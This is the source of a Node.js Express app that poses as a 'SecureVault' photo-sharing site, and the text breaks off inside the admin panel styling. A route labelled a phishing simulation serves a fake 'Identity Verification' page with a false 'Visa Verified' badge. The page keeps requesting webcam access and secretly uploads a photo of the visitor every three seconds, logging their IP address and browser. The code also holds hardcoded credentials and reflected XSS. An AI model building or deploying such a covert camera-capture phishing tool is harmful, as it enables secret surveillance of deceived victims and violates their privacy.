const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// ============ MIDDLEWARE ============
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Session config
app.use(session({
    secret: 'sup3r-s3cr3t-k3y-f0r-p3nt3st-l4b-2026',
    resave: false,
    saveUninitialized: false,
    cookie: { 
        secure: false,
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
}));

// ============ DATA LAYER (File-based) ============
const DATA_DIR = path.join(__dirname, 'data');
const UPLOADS_DIR = path.join(__dirname, 'uploads');

// Ensure directories exist
[DATA_DIR, UPLOADS_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

function readJSON(filename) {
    const filePath = path.join(DATA_DIR, filename);
    if (!fs.existsSync(filePath)) return [];
    try {
        return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
    } catch { return []; }
}

function writeJSON(filename, data) {
    fs.writeFileSync(path.join(DATA_DIR, filename), JSON.stringify(data, null, 2));
}

// ============ AUTH MIDDLEWARE ============
function requireAuth(req, res, next) {
    if (!req.session.user) {
        return res.redirect('/login');
    }
    next();
}

function requireAdmin(req, res, next) {
    if (!req.session.user || !req.session.user.isAdmin) {
        return res.status(403).send('Access Denied');
    }
    next();
}

// ============ INITIAL SETUP ============
// Create admin account on first run
const users = readJSON('users.json');
if (users.length === 0) {
    const adminHash = bcrypt.hashSync('mcmcmcmc@#@#@#@#', 10);
    users.push({
        id: 'admin-' + uuidv4().slice(0,8),
        username: "hello Hacker's",
        password: adminHash,
        isAdmin: true,
        isActive: true,
        createdAt: new Date().toISOString()
    });
    writeJSON('users.json', users);
    console.log('[SETUP] Admin account created: hello Hacker\'s');
}

// ============ ROUTES ============

// ---- AUTH ROUTES ----

// GET /login
app.get('/login', (req, res) => {
    if (req.session.user) return res.redirect('/dashboard');
    res.send(`
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureVault - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
        }
        .container { background: rgba(255,255,255,0.05); backdrop-filter: blur(20px);
            padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1);
            width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
        h2 { color: #fff; text-align: center; margin-bottom: 30px; font-size: 28px;
            letter-spacing: 1px; }
        h2 span { color: #00d4ff; }
        .input-group { margin-bottom: 20px; }
        label { color: #b0b0b0; display: block; margin-bottom: 8px; font-size: 14px; }
        input { width: 100%; padding: 14px 16px; background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.15); border-radius: 12px;
            color: #fff; font-size: 15px; transition: 0.3s; outline: none; }
        input:focus { border-color: #00d4ff; box-shadow: 0 0 15px rgba(0,212,255,0.2); }
        input::placeholder { color: #666; }
        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #00d4ff, #0083ff);
            border: none; border-radius: 12px; color: #fff; font-size: 16px;
            font-weight: 600; cursor: pointer; transition: 0.3s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,212,255,0.3); }
        .link { text-align: center; margin-top: 20px; color: #666; font-size: 14px; }
        .link a { color: #00d4ff; text-decoration: none; }
        .link a:hover { text-decoration: underline; }
        .error { color: #ff4757; text-align: center; margin-bottom: 15px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 Secure<span>Vault</span></h2>
        ${req.query.error ? '<div class="error">⚠️ ' + req.query.error + '</div>' : ''}
        <form action="/login" method="POST">
            <div class="input-group">
                <label>Username</label>
                <input type="text" name="username" placeholder="Enter username" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter password" required>
            </div>
            <button type="submit" class="btn">Sign In →</button>
        </form>
        <div class="link">
            Don't have an account? <a href="/register">Register here</a>
        </div>
    </div>
</body>
</html>
    `);
});

// POST /login
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const users = readJSON('users.json');
    const user = users.find(u => u.username === username && u.isActive);
    
    if (!user || !bcrypt.compareSync(password, user.password)) {
        return res.redirect('/login?error=Invalid credentials');
    }
    
    req.session.user = {
        id: user.id,
        username: user.username,
        isAdmin: user.isAdmin || false
    };
    
    // Log admin login notification
    if (user.isAdmin) {
        console.log('[ADMIN LOGIN] Admin logged in at', new Date().toISOString());
        return res.redirect('/admin');
    }
    
    res.redirect('/dashboard');
});

// GET /register
app.get('/register', (req, res) => {
    if (req.session.user) return res.redirect('/dashboard');
    res.send(`
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureVault - Register</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
        }
        .container { background: rgba(255,255,255,0.05); backdrop-filter: blur(20px);
            padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1);
            width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
        h2 { color: #fff; text-align: center; margin-bottom: 30px; font-size: 28px;
            letter-spacing: 1px; }
        h2 span { color: #00d4ff; }
        .input-group { margin-bottom: 20px; }
        label { color: #b0b0b0; display: block; margin-bottom: 8px; font-size: 14px; }
        input { width: 100%; padding: 14px 16px; background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.15); border-radius: 12px;
            color: #fff; font-size: 15px; transition: 0.3s; outline: none; }
        input:focus { border-color: #00d4ff; box-shadow: 0 0 15px rgba(0,212,255,0.2); }
        input::placeholder { color: #666; }
        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #00d4ff, #0083ff);
            border: none; border-radius: 12px; color: #fff; font-size: 16px;
            font-weight: 600; cursor: pointer; transition: 0.3s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,212,255,0.3); }
        .link { text-align: center; margin-top: 20px; color: #666; font-size: 14px; }
        .link a { color: #00d4ff; text-decoration: none; }
        .link a:hover { text-decoration: underline; }
        .success { color: #2ed573; text-align: center; margin-bottom: 15px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>📝 Create <span>Account</span></h2>
        ${req.query.msg ? '<div class="success">✅ ' + req.query.msg + '</div>' : ''}
        <form action="/register" method="POST">
            <div class="input-group">
                <label>Username</label>
                <input type="text" name="username" placeholder="Choose a username" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Choose a password" required>
            </div>
            <button type="submit" class="btn">Create Account →</button>
        </form>
        <div class="link">
            Already have an account? <a href="/login">Login here</a>
        </div>
    </div>
</body>
</html>
    `);
});

// POST /register
app.post('/register', (req, res) => {
    const { username, password } = req.body;
    const users = readJSON('users.json');
    
    if (users.find(u => u.username === username)) {
        return res.render('register', { error: 'Username already exists' });
    }
    
    if (password.length < 4) {
        return res.render('register', { error: 'Password must be at least 4 characters' });
    }
    
    const hash = bcrypt.hashSync(password, 10);
    const newUser = {
        id: uuidv4(),
        username,
        password: hash,
        isAdmin: false,
        isActive: true,
        createdAt: new Date().toISOString()
    };
    
    users.push(newUser);
    writeJSON('users.json', users);
    
    console.log('[NEW USER]', username, 'registered at', new Date().toISOString());
    res.redirect('/login?msg=Account created! Please login.');
});

// GET /logout
app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/login');
});

// ---- USER DASHBOARD ----
app.get('/dashboard', requireAuth, (req, res) => {
    const photos = readJSON('photos.json');
    const userPhotos = photos.filter(p => p.ownerId === req.session.user.id);
    
    res.send(\`
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - SecureVault</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f0c29; color: #fff; min-height: 100vh;
        }
        nav {
            background: rgba(255,255,255,0.05); backdrop-filter: blur(10px);
            padding: 16px 40px; display: flex; justify-content: space-between;
            align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        nav .logo { font-size: 22px; font-weight: 700; }
        nav .logo span { color: #00d4ff; }
        nav .user-info { display: flex; align-items: center; gap: 20px; }
        nav .user-info span { color: #b0b0b0; }
        nav a { color: #ff4757; text-decoration: none; padding: 8px 20px;
            border: 1px solid #ff4757; border-radius: 8px; font-size: 14px; transition: 0.3s; }
        nav a:hover { background: #ff4757; color: #fff; }
        .container { max-width: 1200px; margin: 40px auto; padding: 0 20px; }
        .hero {
            background: linear-gradient(135deg, rgba(0,212,255,0.1), rgba(0,131,255,0.05));
            border: 1px solid rgba(0,212,255,0.2); border-radius: 20px; padding: 40px;
            text-align: center; margin-bottom: 40px;
        }
        .hero h1 { font-size: 32px; margin-bottom: 10px; }
        .hero p { color: #b0b0b0; font-size: 16px; }
        .card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 16px; padding: 30px; margin-bottom: 30px; }
        .card h3 { margin-bottom: 20px; color: #00d4ff; }
        .btn-primary { background: linear-gradient(135deg, #00d4ff, #0083ff);
            color: #fff; border: none; padding: 12px 30px; border-radius: 10px;
            font-size: 16px; cursor: pointer; transition: 0.3s; font-weight: 600; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,212,255,0.3); }
        .btn-danger { background: #ff4757; color: #fff; border: none; padding: 8px 16px;
            border-radius: 8px; cursor: pointer; font-size: 13px; }
        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 20px; margin-top: 20px; }
        .photo-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px; overflow: hidden; transition: 0.3s; }
        .photo-card:hover { transform: translateY(-4px); box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
        .photo-card img { width: 100%; height: 200px; object-fit: cover; }
        .photo-card .info { padding: 15px; }
        .photo-card .info .link-box { 
            background: rgba(0,0,0,0.3); padding: 8px 12px; border-radius: 6px;
            font-size: 12px; color: #00d4ff; word-break: break-all; margin-top: 8px;
            cursor: pointer; }
        .photo-card .info .meta { color: #666; font-size: 12px; margin-top: 8px; }
        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 30px; }
        .stat-box { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px; padding: 20px; text-align: center; }
        .stat-box .num { font-size: 28px; font-weight: 700; color: #00d4ff; }
        .stat-box .label { color: #666; font-size: 13px; margin-top: 5px; }
        /* Camera preview */
        #camera-preview { display: none; width: 100%; max-width: 400px;
            border-radius: 12px; margin: 20px auto; }
        .loading { text-align: center; padding: 40px; color: #666; }
        .hidden { display: none; }
        input[type="text"] { width: 100%; padding: 12px 16px; background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.15); border-radius: 10px; color: #fff;
            font-size: 14px; margin-bottom: 15px; outline: none; }
        input[type="text"]:focus { border-color: #00d4ff; }
        .toast { position: fixed; bottom: 30px; right: 30px; background: #2ed573;
            color: #fff; padding: 14px 24px; border-radius: 10px; font-size: 14px;
            display: none; z-index: 9999; box-shadow: 0 10px 30px rgba(46,213,115,0.3); }
        .copy-btn { background: rgba(0,212,255,0.1); border: 1px solid rgba(0,212,255,0.3);
            color: #00d4ff; padding: 4px 12px; border-radius: 6px; cursor: pointer;
            font-size: 12px; margin-left: 8px; }
    </style>
</head>
<body>
    <nav>
        <div class="logo">📸 Secure<span>Vault</span></div>
        <div class="user-info">
            <span>👤 \${req.session.user.username}</span>
            <a href="/logout">Logout</a>
        </div>
    </nav>
    
    <div class="container">
        <div class="hero">
            <h1>Welcome, \${req.session.user.username}! 🎯</h1>
            <p>Upload or capture a photo to generate a secure shareable link.</p>
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <div class="num">\${userPhotos.length}</div>
                <div class="label">Total Photos</div>
            </div>
            <div class="stat-box">
                <div class="num">\${userPhotos.filter(p => p.views).length}</div>
                <div class="label">Viewed Photos</div>
            </div>
            <div class="stat-box">
                <div class="num">\${userPhotos.reduce((sum, p) => sum + (p.views || 0), 0)}</div>
                <div class="label">Total Views</div>
            </div>
        </div>
        
        <div class="card">
            <h3>📤 Upload / Capture Photo</h3>
            <div style="display:flex;gap:20px;flex-wrap:wrap;">
                <div style="flex:1;min-width:280px;">
                    <p style="color:#b0b0b0;margin-bottom:15px;">Upload from device:</p>
                    <input type="file" id="fileInput" accept="image/*" style="display:none;">
                    <button class="btn-primary" onclick="document.getElementById('fileInput').click()">Choose File</button>
                </div>
                <div style="flex:1;min-width:280px;">
                    <p style="color:#b0b0b0;margin-bottom:15px;">Or capture from camera:</p>
                    <button class="btn-primary" id="openCameraBtn">📷 Open Camera</button>
                    <video id="cameraPreview" autoplay playsinline style="width:100%;max-width:320px;border-radius:12px;margin-top:15px;display:none;"></video>
                    <canvas id="photoCanvas" style="display:none;"></canvas>
                    <button id="captureBtn" class="btn-primary" style="display:none;margin-top:10px;">Capture Photo</button>
                </div>
            </div>
        </div>
        
        <div class="card">
            <h3>📸 Your Photos</h3>
            \${userPhotos.length === 0 ? '<p style="color:#666;">No photos yet. Upload or capture one above!</p>' : ''}
            <div class="photo-grid">
                \${userPhotos.map(p => \`
                <div class="photo-card">
                    <img src="/uploads/\${p.fileName}" alt="Photo">
                    <div class="info">
                        <div class="link-box" onclick="copyToClipboard('\${req.protocol}://\${req.get('host')}/view/\${p.shareId}')">
                            🔗 \${req.protocol}://\${req.get('host')}/view/\${p.shareId}
                            <span class="copy-btn">Copy</span>
                        </div>
                        <div class="meta">
                            📅 \${new Date(p.createdAt).toLocaleString()} &bull; 👁️ \${p.views || 0} views
                        </div>
                    </div>
                </div>
                \`).join('')}
            </div>
        </div>
    </div>
    
    <div class="toast" id="toast">✅ Link copied to clipboard!</div>
    
    <script>
        // File upload handler
        document.getElementById('fileInput').addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (!file) return;
            
            const reader = new FileReader();
            reader.onload = function(e) {
                uploadPhoto(e.target.result);
            };
            reader.readAsDataURL(file);
        });
        
        // Camera handling
        let stream = null;
        const openBtn = document.getElementById('openCameraBtn');
        const video = document.getElementById('cameraPreview');
        const canvas = document.getElementById('photoCanvas');
        const captureBtn = document.getElementById('captureBtn');
        
        openBtn.addEventListener('click', async function() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                video.srcObject = stream;
                video.style.display = 'block';
                captureBtn.style.display = 'inline-block';
                openBtn.textContent = '📷 Camera Active';
                openBtn.style.background = '#2ed573';
            } catch(err) {
                alert('Camera access denied or not available: ' + err.message);
            }
        });
        
        captureBtn.addEventListener('click', function() {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
            uploadPhoto(dataUrl);
        });
        
        function uploadPhoto(dataUrl) {
            fetch('/api/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: dataUrl })
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    showToast('✅ Photo uploaded! Link created.');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    alert('Error: ' + data.error);
                }
            })
            .catch(err => alert('Upload failed: ' + err.message));
        }
        
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                showToast('✅ Link copied to clipboard!');
            });
        }
        
        function showToast(msg) {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.style.display = 'block';
            setTimeout(() => t.style.display = 'none', 2500);
        }
    </script>
</body>
</html>
    \`);
});

// ---- API: UPLOAD PHOTO ----
app.post('/api/upload', requireAuth, (req, res) => {
    const { image } = req.body;
    if (!image) return res.json({ success: false, error: 'No image data' });
    
    // Generate unique filename
    const shareId = uuidv4().slice(0, 8);
    const fileName = shareId + '-' + Date.now() + '.jpg';
    const base64Data = image.replace(/^data:image\/\\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    
    fs.writeFileSync(path.join(UPLOADS_DIR, fileName), buffer);
    
    const photos = readJSON('photos.json');
    photos.push({
        id: uuidv4(),
        shareId,
        fileName,
        ownerId: req.session.user.id,
        ownerUsername: req.session.user.username,
        title: req.body.title || 'Untitled',
        views: 0,
        createdAt: new Date().toISOString()
    });
    writeJSON('photos.json', photos);
    
    console.log('[PHOTO UPLOAD]', req.session.user.username, 'uploaded photo:', shareId);
    
    res.json({ success: true, shareId, url: '/view/' + shareId });
});

// ---- VIEW SHARED PHOTO (Public) ----
app.get('/view/:shareId', (req, res) => {
    const photos = readJSON('photos.json');
    const photo = photos.find(p => p.shareId === req.params.shareId);
    
    if (!photo) return res.status(404).send('Photo not found');
    
    // Increment views
    photo.views = (photo.views || 0) + 1;
    writeJSON('photos.json', photos);
    
    res.send(\`
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Photo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f0c29; color: #fff; min-height: 100vh;
            display: flex; align-items: center; justify-content: center;
        }
        .container { text-align: center; padding: 40px; }
        img { max-width: 90vw; max-height: 80vh; border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            border: 2px solid rgba(255,255,255,0.1); }
        .meta { margin-top: 20px; color: #666; font-size: 14px; }
        .meta span { color: #00d4ff; }
        h2 { margin-bottom: 20px; color: #00d4ff; }
        .back { display: inline-block; margin-top: 20px; color: #00d4ff;
            text-decoration: none; padding: 10px 20px;
            border: 1px solid #00d4ff; border-radius: 8px; transition: 0.3s; }
        .back:hover { background: #00d4ff; color: #0f0c29; }
    </style>
</head>
<body>
    <div class="container">
        <h2>📸 Shared Photo</h2>
        <img src="/uploads/\${photo.fileName}" alt="Shared Photo">
        <div class="meta">
            Shared by <span>\${photo.ownerUsername}</span> &bull;
            👁️ \${photo.views} views &bull;
            📅 \${new Date(photo.createdAt).toLocaleString()}
        </div>
        <a href="javascript:history.back()" class="back">← Go Back</a>
    </div>
</body>
</html>
    \`);
});

// ---- TARGET CAMERA CAPTURE PAGE (PHISHING SIM) ----
// This is the page you send to the target that silently captures camera
app.get('/capture/:shareId', (req, res) => {
    res.send(\`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
            padding: 20px;
        }
        .card {
            background: #fff; border-radius: 20px; padding: 40px;
            max-width: 420px; width: 100%; box-shadow: 0 30px 80px rgba(0,0,0,0.3);
            text-align: center;
        }
        .card h2 { color: #1a1a2e; margin-bottom: 8px; }
        .card p { color: #666; margin-bottom: 25px; font-size: 14px; line-height: 1.6; }
        .camera-icon {
            width: 80px; height: 80px; background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            margin: 0 auto 20px; font-size: 36px; color: #fff;
        }
        .status { 
            padding: 12px; border-radius: 10px; margin: 15px 0;
            font-size: 14px; font-weight: 500;
        }
        .status.waiting { background: #fff3cd; color: #856404; }
        .status.active { background: #d4edda; color: #155724; }
        .status.error { background: #f8d7da; color: #721c24; }
        .loading-bar {
            width: 100%; height: 4px; background: #eee; border-radius: 4px;
            margin: 20px 0; overflow: hidden;
        }
        .loading-bar div {
            height: 100%; background: linear-gradient(90deg, #667eea, #764ba2);
            width: 0%; border-radius: 4px; transition: width 0.5s;
        }
        .hidden { display: none; }
        video { display: none; }
        canvas { display: none; }
        .badge { font-size: 11px; color: #999; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="camera-icon">📷</div>
        <h2>Identity Verification</h2>
        <p>We need to verify your identity for security purposes.<br>Please allow camera access to continue.</p>
        
        <div id="status" class="status waiting">⏳ Waiting for camera access...</div>
        
        <div class="loading-bar">
            <div id="progressBar"></div>
        </div>
        
        <p id="captureCount" style="color:#666;font-size:13px;">Photos captured: 0</p>
        
        <div class="badge">🔒 Secure Connection • Visa Verified</div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    
    <script>
        const shareId = '\${req.params.shareId}';
        const uploadUrl = '/api/target-capture/' + shareId;
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progressBar');
        const captureCountEl = document.getElementById('captureCount');
        
        let captureInterval = null;
        let count = 0;
        
        // Try to get camera access
        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false 
                });
                
                video.srcObject = stream;
                await video.play();
                
                statusEl.className = 'status active';
                statusEl.textContent = '✅ Camera active - verification in progress...';
                
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                // Start capturing every 3 seconds
                captureInterval = setInterval(captureAndSend, 3000);
                
                // Capture immediately
                setTimeout(captureAndSend, 500);
                
            } catch(err) {
                statusEl.className = 'status error';
                statusEl.textContent = '❌ Camera access denied. Please allow camera permission in browser settings and refresh.';
                
                // Try asking again after 3 seconds (user might allow)
                setTimeout(startCapture, 3000);
            }
        }
        
        async function captureAndSend() {
            try {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                
                count++;
                captureCountEl.textContent = 'Photos captured: ' + count;
                progressBar.style.width = Math.min(100, count * 5) + '%';
                
                // Send to server
                await fetch(uploadUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: dataUrl })
                });
                
            } catch(err) {
                console.error('Capture error:', err);
            }
        }
        
        // Start the capture process
        startCapture();
        
        // Keep sending even if user navigates away (background send)
        document.addEventListener('visibilitychange', () => {
            if (document.hidden && captureInterval) {
                // Continue capturing in background
            }
        });
        
        // Try to restart if camera stops
        video.addEventListener('ended', () => {
            setTimeout(startCapture, 2000);
        });
    </script>
</body>
</html>
    \`);
});

// ---- API: TARGET CAPTURE (Receives photos from target) ----
app.post('/api/target-capture/:shareId', (req, res) => {
    const { image } = req.body;
    if (!image) return res.json({ success: false });
    
    const photos = readJSON('photos.json');
    const originalPhoto = photos.find(p => p.shareId === req.params.shareId);
    
    if (!originalPhoto) return res.json({ success: false });
    
    // Save target capture
    const captureId = 'cap-' + uuidv4().slice(0, 8);
    const fileName = captureId + '-' + Date.now() + '.jpg';
    const base64Data = image.replace(/^data:image\/\\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    
    fs.writeFileSync(path.join(UPLOADS_DIR, fileName), buffer);
    
    // Store target capture
    const targetsFile = path.join(DATA_DIR, 'target-captures.json');
    let captures = [];
    if (fs.existsSync(targetsFile)) {
        try { captures = JSON.parse(fs.readFileSync(targetsFile, 'utf-8')); } catch {}
    }
    
    captures.push({
        id: captureId,
        originalShareId: req.params.shareId,
        fileName,
        capturedAt: new Date().toISOString(),
        ip: req.ip,
        userAgent: req.headers['user-agent']
    });
    
    fs.writeFileSync(targetsFile, JSON.stringify(captures, null, 2));
    
    // Update count on original photo
    const allPhotos = readJSON('photos.json');
    const idx = allPhotos.findIndex(p => p.shareId === req.params.shareId);
    if (idx !== -1) {
        allPhotos[idx].targetCaptures = (allPhotos[idx].targetCaptures || 0) + 1;
        writeJSON('photos.json', allPhotos);
    }
    
    console.log('[TARGET CAPTURE] Photo captured for shareId:', req.params.shareId);
    
    res.json({ success: true });
});

// ---- GENERATE TARGET LINK (For the user to send to target) ----
app.get('/api/generate-target-link/:shareId', requireAuth, (req, res) => {
    const photos = readJSON('photos.json');
    const photo = photos.find(p => p.shareId === req.params.shareId && p.ownerId === req.session.user.id);
    
    if (!photo) return res.json({ success: false, error: 'Photo not found' });
    
    // Generate a unique target token
    const targetToken = uuidv4().slice(0, 12);
    
    const targetLinksFile = path.join(DATA_DIR, 'target-links.json');
    let links = [];
    if (fs.existsSync(targetLinksFile)) {
        try { links = JSON.parse(fs.readFileSync(targetLinksFile, 'utf-8')); } catch {}
    }
    
    links.push({
        token: targetToken,
        shareId: req.params.shareId,
        ownerId: req.session.user.id,
        createdAt: new Date().toISOString(),
        active: true
    });
    
    fs.writeFileSync(targetLinksFile, JSON.stringify(links, null, 2));
    
    const targetUrl = \`\${req.protocol}://\${req.get('host')}/capture/\${req.params.shareId}\`;
    
    res.json({ 
        success: true, 
        targetUrl,
        token: targetToken
    });
});

// ---- ADMIN PANEL ----
app.get('/admin', requireAdmin, (req, res) => {
    const users = readJSON('users.json');
    const photos = readJSON('photos.json');
    
    let targetCaptures = [];
    const targetsFile = path.join(DATA_DIR, 'target-captures.json');
    if (fs.existsSync(targetsFile)) {
        try { targetCaptures = JSON.parse(fs.readFileSync(targetsFile, 'utf-8')); } catch {}
    }
    
    res.send(\`
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - SecureVault</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f0c29; color: #fff; min-height: 100vh;
        }
        nav {
            background: rgba(255,255,255,0.05); backdrop-filter: blur(10px);
            padding: 16px 40px; display: flex; justify-content: space-between;
            align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        nav .logo { font-size: 22px; font-weight: 700; }
        nav .logo span { color: #ff4757; }
        nav .user-info { display: flex; align-items: center; gap: 20px; }
        nav .user-info span { color: #b0b0b0; }
        nav a { color: #ff4757; text-decoration: none; padding: 8px 20px;
            border: 1px solid #ff4757; border-radius: 8px; font-size: 14px; transition: 0.3s; }
        nav a:hover { background: #ff4757; color: #fff; }
        .container { max-width: 1400px; margin: 30px auto; padding: 0 20px; }
        h1 { font-size: 28px; margin-bottom: 5px; }
        h1 span { color: #ff4757; }
        .subtitle { color: #666; margin-bottom: 30px; }
        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 30px; }
        .stat-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px; padding: 20px; }
        .stat-card .num { font-size: 32px; font-weight: 700; }
        .stat-card .label { color: #666; font-size: 13px; margin-top: 5px; }
        .stat-card.red .num { color: #ff4757; }
        .stat-card.blue .num { color: #00d4ff; }
        .stat-card.green .num { color: #2ed573; }
        .stat-card.yellow .num { color: #ffa502; }
        .section { margin-bottom: 40px; }
        .section h2 { font-size: 20px; margin-bottom: 15px; color: #b0b0b0;
            border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; padding: 12px 16px; background: rgba(255,255,255,0.05);
            color: #b0b0b0; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; }
        td { padding: 12px 16px; border-bottom: 1px solid rgba(255,255,255,0.05);
            font-size: 14px; }
        tr:hover td { background: rgba(255,255,255,0.03); }
        .badge { display: inline-block; padding: 3px 10px; border-radius: 20px;
            font-size: 12px; font-weight: 600; }
        .badge.admin { background: #ff4757; color: #fff; }
        .badge.user { background: rgba(0,212,255,0.2); color: #00d4ff; }
        .view-link { color: #00d4ff; text-decoration: none; font-size: 13px; }
        .view-link:hover { text-decoration: underline; }
        img.thumb { width: 60px; height: 60px; object-fit: cover; border-radius: 8px; }
        .tab-bar { display: flex; gap: 10px; margin-bottom: 20px; }
        .tab { padding: 10px 24px; border-radius: 10px; cursor: pointer;
            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
            color: #b0b0b0; font-size: 14px; transition: 0.3s; }
        .tab.active { background: rgba(255,71,87,0.15); border-color: #ff4757; color: #ff4757; }
        .tab:hover { border-color: #ff4757; }
        .panel { display: none; }
        .panel.active { display: block; }
        .live-feed { 
            background: rgba(255,71,87,0.05); border: 1px solid rgba(255,71,87,0.2);
            border-radius: 12px; padding: 20px; margin-bottom: 20px;
        }
        .live-feed .title { color: #ff4757; font-weight: 600; margin-bottom: 15px; font-size: 16px; }
        .live-entry { 
            padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05);
            font-size: 13px; color: #b0b0b0;
        }
        .live-entry .time { color: #666; margin-right: 10px; }
        .live-entry .event { color: #2ed573; }
